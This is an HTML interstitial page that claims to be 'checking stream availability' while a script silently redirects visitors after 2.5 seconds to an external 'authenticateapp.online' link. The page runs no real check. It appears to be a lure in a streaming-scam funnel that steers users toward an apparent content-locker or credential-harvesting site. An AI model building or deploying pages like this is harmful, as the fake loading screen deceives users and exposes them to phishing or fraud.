<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<!-- This line fixes the "small" look on mobile -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Checking Stream...</title>

<!-- Added FontAwesome and Google Fonts to match index.html -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<script>
setTimeout(function() {
  window.location.href = "https://authenticateapp.online/cl/i/4orrm4";
}, 2500);
</script>

<style>
:root {
  --bg-color: #0b0f1a;
  --text-primary: #ffffff;
  --text-secondary: #94a3b8;
}

body {
  background: var(--bg-color);
  color: var(--text-secondary); 
  font-family: 'Inter', -apple-system, system-ui, sans-serif;
  text-align: center;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  height: 100vh;
  margin: 0;
  -webkit-font-smoothing: antialiased;
}

.loading-container {
  padding: 40px;
  width: 100%;
  max-width: 400px;
}

.loader-icon {
  font-size: 32px; /* Slightly larger for better mobile visibility */
  margin-bottom: 24px;
  color: var(--text-secondary);
  display: inline-block;
}

h2 {
  color: var(--text-primary); /* Using primary white for the heading */
  font-size: 20px;
  font-weight: 700; /* Matching index.html's bold feel */
  margin: 0;
  letter-spacing: -0.5px;
}

p {
  margin-top: 12px;
  font-size: 15px;
  color: var(--text-secondary);
  opacity: 0.9;
}

/* Subtle pulse animation to match the "Live" feel */
@keyframes pulse-opacity {
  0% { opacity: 1; }
  50% { opacity: 0.6; }
  100% { opacity: 1; }
}

.loading-container h2 {
  animation: pulse-opacity 2s infinite ease-in-out;
}
</style>

</head>
<body>

<div class="loading-container">
  <i class="fa-solid fa-circle-notch fa-spin loader-icon"></i>
  <h2>Checking stream availability...</h2>
  <p>Please wait, preparing your access.</p>
</div>

</body>
</html>
